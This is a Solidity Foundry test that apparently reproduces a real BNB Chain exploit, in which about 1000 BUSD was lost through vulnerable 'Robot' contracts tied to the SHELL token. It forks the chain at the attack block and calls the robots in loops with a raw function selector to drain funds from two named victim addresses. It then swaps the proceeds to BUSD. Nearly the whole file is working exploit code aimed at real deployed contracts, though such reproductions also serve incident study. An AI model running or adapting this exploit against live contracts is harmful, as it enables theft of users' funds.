// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~1000 $BUSD
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Attack Contract : https://bscscan.com/address/0xd66a43d0a3e853b98d14268e240cf973e3fa986e
// Vulnerable Contract : https://bscscan.com/address/0xa898b78b7cbbabacf9d179c4c46c212c0ac66f46
// Attack Tx : https://bscscan.com/tx/0x24f114c0ef65d39e0988d164e052ce8052fe4a4fd303399a8c1bb855e8da01e9

import "forge-std/Test.sol";
import "./../interface.sol";


contract ContractTest is Test {
    event TokenBalance(string key, uint256 val);

    IERC20 SHELL = IERC20(0x5Df670150Be23c7BCF764E57F24D46BA88dCa621);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address Victim1 = 0x100006d330F46e8f60359aFE62C29714e5D8438C;
    address Victim2 = 0xf5339777FE60a597316ad0B9Ed8A2b0444cF8317;

    address Robot1 = 0xa898b78B7cbBabacf9d179C4C46c212c0aC66F46;
    address Robot2 = 0x923AA7C73909b21CF0854904dF2fA2394087f818;

    function setUp() public {
        vm.createSelectFork("bsc", 35_273_751 - 1);
        vm.label(address(Victim1), "Victim1");
        vm.label(address(Victim2), "Victim2");
        vm.label(address(Robot1), "Robot1");
        vm.label(address(Robot2), "Robot2");
    }

    function testExploit() public {
        BUSD.transfer(address(0x000000000000000000000000000000000000dEaD), BUSD.balanceOf(address(this)));
        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
        SHELL.approve(address(Router), type(uint256).max);
        while (BUSD.balanceOf(Victim1) > 10 * 1e18) {
            Robot1.call(
                abi.encodeWithSelector(
                    bytes4(0x5f90d725), Victim2, Victim1, address(this), BUSD.balanceOf(address(Victim1)), 100, 360
                )
            );
        }
        while (BUSD.balanceOf(Victim2) > 10 * 1e18) {
            Robot2.call(
                abi.encodeWithSelector(
                    bytes4(0x5f90d725), Victim2, Victim2, address(this), BUSD.balanceOf(address(Victim2)), 100, 360
                )
            );
        }

        TOKENTOBUSD();
        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
    }

    function TOKENTOBUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(SHELL);
        path[1] = address(BUSD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHELL.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
    fallback() external payable {}
    receive() external payable {}
}
